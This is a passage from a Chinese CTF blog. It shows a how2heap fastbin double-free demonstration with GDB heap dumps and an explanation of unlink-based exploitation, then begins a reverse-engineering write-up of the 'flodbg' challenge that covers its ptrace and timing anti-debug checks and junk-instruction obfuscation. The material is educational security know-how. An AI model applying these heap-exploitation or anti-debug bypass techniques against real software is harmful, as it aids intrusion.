<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/tmp$ ./a.out</span><br><span class="line">This file demonstrates a simple <span class="keyword">double</span>-<span class="built_in">free</span> attack with fastbins.</span><br><span class="line">Allocating <span class="number">3</span> buffers.</span><br><span class="line">1st malloc(8): 0x83b5008</span><br><span class="line">2nd malloc(8): 0x83b5018</span><br><span class="line">3rd malloc(8): 0x83b5028</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we <span class="built_in">free</span> <span class="number">0x83b5008</span> again, things will crash because <span class="number">0x83b5008</span> is at the top of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">So, instead, we'll free 0x83b5018.</span><br><span class="line">Now, we can <span class="built_in">free</span> <span class="number">0x83b5008</span> again, since it's <span class="keyword">not</span> the head of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">Now the free list has [ 0x83b5008, 0x83b5018, 0x83b5008 ]. If we malloc 3 times, we'll get 0x83b5008 twice!</span><br><span class="line">1st malloc(8): 0x83b5008</span><br><span class="line">2nd malloc(8): 0x83b5018</span><br><span class="line">3rd malloc(8): 0x83b5008</span><br></pre></td></tr></table></figure>

<p>GDB调试分析</p>
<p>第一次malloc：a</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">16</span> (<span class="number">0x10</span>)</span><br><span class="line">Usable size: <span class="number">12</span> (<span class="number">0xc</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>第二次malloc：b</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b018</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">16</span> (<span class="number">0x10</span>)</span><br><span class="line">Usable size: <span class="number">12</span> (<span class="number">0xc</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>第三次malloc：c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b028</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b028</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">16</span> (<span class="number">0x10</span>)</span><br><span class="line">Usable size: <span class="number">12</span> (<span class="number">0xc</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>第一次free，a已经并入了fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bin</span><br><span class="line">[+] No Tcache in <span class="keyword">this</span> version of libc</span><br><span class="line">─────────────────────────────────── Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fb2780</span> ───────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x28</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x30</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x38</span>] <span class="number">0x00</span></span><br><span class="line">──────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────</span><br><span class="line">[+] Found <span class="number">0</span> chunks in unsorted bin.</span><br><span class="line">───────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────</span><br><span class="line">[+] Found <span class="number">0</span> chunks in <span class="number">0</span> small non-empty bins.</span><br><span class="line">───────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────</span><br><span class="line">[+] Found <span class="number">0</span> chunks in <span class="number">0</span> large non-empty bins.</span><br></pre></td></tr></table></figure>

<p>第二次free，b已经并入了fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bin</span><br><span class="line">[+] No Tcache in <span class="keyword">this</span> version of libc</span><br><span class="line">─────────────────────────────────── Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fb2780</span> ───────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  Chunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x28</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x30</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x38</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure>

<p>再一次free a，可以发现fastbin里面出现了两次a</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bin</span><br><span class="line">[+] No Tcache in <span class="keyword">this</span> version of libc</span><br><span class="line">─────────────────────────────────── Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fb2780</span> ───────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  ←  Chunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  →  [loop detected]</span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x28</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x30</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x38</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure>

<h4 id="Double-Free漏洞原理"><a href="#Double-Free漏洞原理" class="headerlink" title="Double Free漏洞原理"></a>Double Free漏洞原理</h4><ul>
<li>对一个指向<strong>malloc</strong>分配的<strong>heap</strong>内存的指针<strong>p</strong>进行<strong>free</strong>之后，并没有将该指针置<strong>NULL</strong>。导致，即使<strong>free</strong>之后指针<strong>p</strong>仍然指向<strong>heap</strong>内存，潜在着利用的可能。</li>
</ul>
<h4 id="利用基础"><a href="#利用基础" class="headerlink" title="利用基础"></a>利用基础</h4><ul>
<li><p>在堆漏洞利用里，很多都是基于触发<strong>unlink</strong>来实现任意代码执行的，<strong>double free</strong>也是基于此</p>
</li>
<li><p>不同于<strong>unlink</strong>的是，<strong>unlink</strong>是利用溢出来伪造<strong>chunk</strong>，实现<strong>unlink</strong>的。而<strong>double  free</strong>则一般是需要至少获得三个连续的<strong>chunk</strong>，再全部<strong>free</strong>。之后再重新分配两个大<strong>chunk</strong>（能够覆盖前面<strong>free</strong>的三个<strong>chunk</strong>），通过伪造<strong>p</strong>（利用绕过<strong>unlink</strong>的检查的技术伪造）<strong>chunk</strong>和一个引导触发<strong>unlink</strong>的<strong>chunk</strong>即可。构造如下图</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/1.png" alt></p>
</li>
</ul>
<p>注意，伪造的数据中fake_size 应该等于 fake_pre_size2+1。以满足大小一致检查</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/27/ß█╖σ╝½┐═í¬í¬flodbg/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/27/ß█╖σ╝½┐═í¬í¬flodbg/" class="post-title-link" itemprop="url">巅峰极客——flodbg</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-27 00:37:54 / Modified: 15:38:16" itemprop="dateCreated datePublished" datetime="2019-10-27T00:37:54-07:00">2019-10-27</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>检查一下程序</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/巅峰极客/flodbg$ checksec flodbg</span><br><span class="line">[*] '/mnt/hgfs/share/\xe5\xb7\x85\xe5\xb3\xb0\xe6\x9e\x81\xe5\xae\xa2/flodbg/flodbg'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>拿到程序发现运行发现一直没有结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/巅峰极客/flodbg$ ./flodbg</span><br></pre></td></tr></table></figure>

<p> 直接IDA Pro打开分析一下函数流程</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// [rsp-8h] [rbp-4E0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-8h] [rbp-4E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+0h] [rbp-4D8h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+14h] [rbp-4C4h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+4Ch] [rbp-48Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+50h] [rbp-488h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+54h] [rbp-484h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+58h] [rbp-480h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+5Ch] [rbp-47Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+60h] [rbp-478h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+64h] [rbp-474h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+68h] [rbp-470h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+6Ch] [rbp-46Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+70h] [rbp-468h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+74h] [rbp-464h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+78h] [rbp-460h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+7Ch] [rbp-45Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+80h] [rbp-458h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+84h] [rbp-454h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [rsp+88h] [rbp-450h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [rsp+8Ch] [rbp-44Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [rsp+90h] [rbp-448h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+94h] [rbp-444h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+98h] [rbp-440h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v31; <span class="comment">// [rsp+4A8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">char</span> *)&amp;v9;</span><br><span class="line">  v31 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">    *((_DWORD *)v3 - <span class="number">1</span>) = _IO_getc(_bss_start);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != &amp;v11 );</span><br><span class="line">  v12 = <span class="string">'S'</span>;</span><br><span class="line">  v13 = <span class="string">'@'</span>;</span><br><span class="line">  v14 = <span class="string">'y'</span>;</span><br><span class="line">  v15 = <span class="string">'R'</span>;</span><br><span class="line">  v16 = <span class="string">'t'</span>;</span><br><span class="line">  v17 = <span class="string">'f'</span>;</span><br><span class="line">  v18 = <span class="string">'T'</span>;</span><br><span class="line">  v19 = <span class="string">'l'</span>;</span><br><span class="line">  v20 = <span class="string">'0'</span>;</span><br><span class="line">  v21 = <span class="string">'+'</span>;</span><br><span class="line">  v22 = <span class="string">'a'</span>;</span><br><span class="line">  v23 = <span class="string">'g'</span>;</span><br><span class="line">  v24 = <span class="string">'-'</span>;</span><br><span class="line">  v25 = <span class="string">'L'</span>;</span><br><span class="line">  v26 = <span class="string">'_'</span>;</span><br><span class="line">  v27 = <span class="string">'3'</span>;</span><br><span class="line">  v28 = <span class="string">'M'</span>;</span><br><span class="line">  v29 = <span class="string">'&#125;'</span>;</span><br><span class="line">  v30 = <span class="string">'&#123;'</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      func3(&amp;v10, <span class="number">2L</span>L, <span class="number">7L</span>L, <span class="number">14L</span>L);</span><br><span class="line">      v7 = <span class="number">4196782L</span>L;</span><br><span class="line">      JUMPOUT(__CS__, v8 + <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="number">10000000</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    --v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们长期等待无响应的代码是因为这段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v6 = <span class="number">10000000</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    --v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br></pre></td></tr></table></figure>

<p>然后注意到这里有一个<strong>ptrace</strong>函数，且调用的是<strong>ptrace</strong>函数，所以这个程序是加入了反调试的功能的。 <strong>ptrace</strong>函数提供了父进程观察和控制其子进程执行的能力，发送给被跟踪的子进程的信号(除了<strong>SIGKILL</strong>)，都会被转发给父进程，这也是调试器主要原理。 总而言之就是如果我们使用GDB调试这个程序，<strong>ptrace</strong>函数执行成功就会返回大于0的值，那么程序就会中止</p>
<p>这里还存在一个反调试方式就是时间戳的检查</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = time(<span class="number">0L</span>L);</span><br><span class="line">v5 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br></pre></td></tr></table></figure>

<p>被调试时，进程的运行速度大大降低，例如，单步调试大幅降低恶意代码的运行速度，所以时钟检测是恶意代码探测调试器存在的最常用方式之一。有如下两种用时钟检测来探测调试器存在的方法。记录一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后，则可以认为存在调试器。记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理完异常，因为调试器处理异常的速度非常慢。默认情况下，调试器处理异常时需要人为干预，这导致大量延迟。虽然很多调试器允许我们忽略异常，将异常直接返回程序，但这样操作仍然存在不小的延迟</p>
<p>然后我们看这段代码使用了花指令来混淆</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JUMPOUT(__CS__, v8 + <span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004009</span>C4                 dd <span class="number">48</span>EBEBEBh</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">11B</span>908247C8Dh, <span class="number">4B</span>E00000006BA00h, <span class="number">440E8000000</span>h, <span class="number">0</span>EBB866C8FFC0FFEBh</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>EB90EBFA74C03105h, <span class="number">0F</span>FC0FFEBC8FFC0FFh, <span class="number">8</span>D48C8FFC0FFEBC8h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>AB924247Ch, <span class="number">3B</span>E00000005BAh, <span class="number">0E800000409</span>E80000h, <span class="number">24B</span>48D48FFFFFE04h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">75E8</span>C789000000A0h, <span class="number">0F</span>C589C085000004h, <span class="number">5</span>C8D480000020B85h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0B</span>A0000000FB92C24h, <span class="number">6B</span>E00000009h, <span class="number">3</span>CFE8E7894800h, <span class="number">6B</span>A00000008B900h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">3B</span>E000000h, <span class="number">3B</span>8E8DF8948h, <span class="number">89F</span>FFFFD71E8FF31h, <span class="number">0F</span>02FF83E72944C7h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>EB9000001D48Fh, <span class="number">0B</span>E00000005BA0000h, <span class="number">0E8</span>EF894C00000001h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0F</span>FFCF7E80000038Ch, <span class="number">0F</span>FFFFD10E8C789FFh, <span class="number">0F</span>FFFFD78E8C58941h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">1</span>AA850FC53941h, <span class="number">13B</span>9F63100h, <span class="number">0E7894800000002</span>BAh, <span class="number">356E840246</span>C8D4Ch</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C03105EBB8660000h, <span class="number">0F</span>FC0FFEB90EBFA74h, <span class="number">0</span>C03105EBB86690C8h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C8FFC0FFEBEBFA74h, <span class="number">10B</span>90C247C8D48h, <span class="number">0B</span>E00000005BA0000h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">31F</span>E800000003h, <span class="number">4B</span>93C247C8D4800h, <span class="number">3B</span>A000000h, <span class="number">306E800000001</span>BEh</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C8FFC0FFEB900000h, <span class="number">0</span>C03105EBB8669090h, <span class="number">5</span>EBB86690EBFA74h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">909090</span>EBFA74C031h, <span class="number">0B</span>B920247C8D48h, <span class="number">0B</span>E00000006BA0000h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">2</span>CFE800000003h, <span class="number">13B</span>9F63100h, <span class="number">0E7894800000007</span>BAh, <span class="number">0E89090000002</span>BBE8h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C083485800000000h, <span class="number">0</span>EBEBEBEBEBE0FF0Ch, <span class="number">74</span>C03105EBB86690h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">3B</span>9F63190EBFAh, <span class="number">4</span>C00000002BA0000h, <span class="number">4800000289E8</span>EF89h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">9B</span>9F63128247C8Dh, <span class="number">2B</span>A000000h, <span class="number">0E8</span>FF3100000273E8h, <span class="number">2944</span>C789FFFFFC2Ch</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">8F</span>8F0F03FF83E7h, <span class="number">8B</span>9DF89480000h, <span class="number">0B</span>E00000003BA0000h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">45E8</span>DB3100000001h, <span class="number">3B</span>9000002h, <span class="number">4</span>CF63100000002BAh, <span class="number">0B</span>800000231E8EF89h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">2E660</span>EEB00000053h, <span class="number">841F</span>0Fh, <span class="number">759</span>C043B509C448Bh, <span class="number">0F</span>B834801C383483Chc</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">400F</span>FDBFED7513h, <span class="number">948B</span>48FFFFFB63E8h, <span class="number">334864000004</span>A824h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0E889000000282514</span>h, <span class="number">4B</span>8C481482475h, <span class="number">0</span>C35D415C415D5B00h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0F</span>F2BFD8EBFFCD83h, <span class="number">89F</span>FFFFB31E80040h</span><br><span class="line">.text:<span class="number">0000000000400</span>C50                 db <span class="number">0</span>DFh</span><br></pre></td></tr></table></figure>

<p>我们绕过这些反调试的手法可以直接path掉或者在动态调试的时候通过直接修改寄存器绕过即可，我们首先来通过path修改绕过<strong>ptrace</strong>函数</p>
